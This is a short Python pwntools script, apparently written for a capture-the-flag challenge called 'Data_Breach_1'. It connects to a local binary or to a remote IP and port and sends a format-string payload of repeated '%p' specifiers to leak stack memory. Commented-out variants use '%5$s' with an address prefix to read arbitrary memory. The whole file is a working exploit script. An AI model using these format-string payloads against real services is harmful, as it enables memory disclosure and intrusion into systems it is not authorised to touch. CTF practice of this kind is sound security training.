from pwn import *

local = False
local = True


if local:
    p = process("./Data_Breach_1")
    input("attach gdb")
else:
    p = remote("20.219.137.184", 13371)

msg = p.recv()
print(msg)


payload =  b"|%p|"*20
# payload = b"\x40\x40\xc0" + b"|%5$s|"
# payload =  "|%1$p|"
p.sendline(payload)

resp = p.recv()
print(resp)
p.interactive()
p.close()


    # p.interactive()
